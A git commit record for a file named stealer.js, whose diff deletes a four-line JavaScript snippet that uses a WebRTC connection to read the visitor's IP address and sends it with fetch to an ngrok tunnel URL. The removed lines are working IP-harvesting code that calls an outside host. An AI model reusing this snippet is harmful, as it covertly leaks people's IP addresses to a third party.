d59c498bd22cf815058df70dc5f43f45a437405b
Rudra Pratap Singh <rajputhaxor1337@gmail.com>
2025-03-27 01:56:20 +0530

    Update stealer.js

--- stealer.js
+++ stealer.js
@@ -1,4 +1,1 @@
-let pc=new RTCPeerConnection({iceServers:[]});
-pc.createDataChannel("");
-pc.createOffer().then(o=>pc.setLocalDescription(o));
-pc.onicecandidate=e=>e&&e.candidate&&fetch("https://5f36-103-176-65-40.ngrok-free.app/log?ip="+e.candidate.candidate.split(" ")[4]);
+
